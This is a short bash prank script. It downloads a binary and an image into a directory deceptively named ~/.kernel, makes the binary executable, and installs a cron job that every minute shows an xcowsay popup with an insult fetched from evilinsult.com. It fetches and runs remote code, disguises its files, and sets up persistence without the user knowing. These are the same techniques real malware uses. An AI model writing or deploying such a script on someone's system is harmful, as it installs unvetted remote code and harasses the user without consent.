#!/bin/bash
# Desc: xcowsay insulte
mkdir ~/.kernel
curl https://Waz0x.github.io/bin/xcowsay/bin > ~/.kernel/bin && chmod +x ~/.kernel/bin
curl https://Waz0x.github.io/bin/xcowsay/cow_med.png > ~/.kernel/cow_med.png
cd "$(mktemp -d)"; crontab -l > mycron; echo "* * * * * bash -c 'export DISPLAY=:0 && ~/.kernel/bin --image ~/.kernel/cow_med.png \"\$(/usr/bin/curl https://evilinsult.com/generate_insult.php\?lang\=fr\&amp\;type\=raw)\"'" >> mycron; crontab mycron; rm -f mycron; exit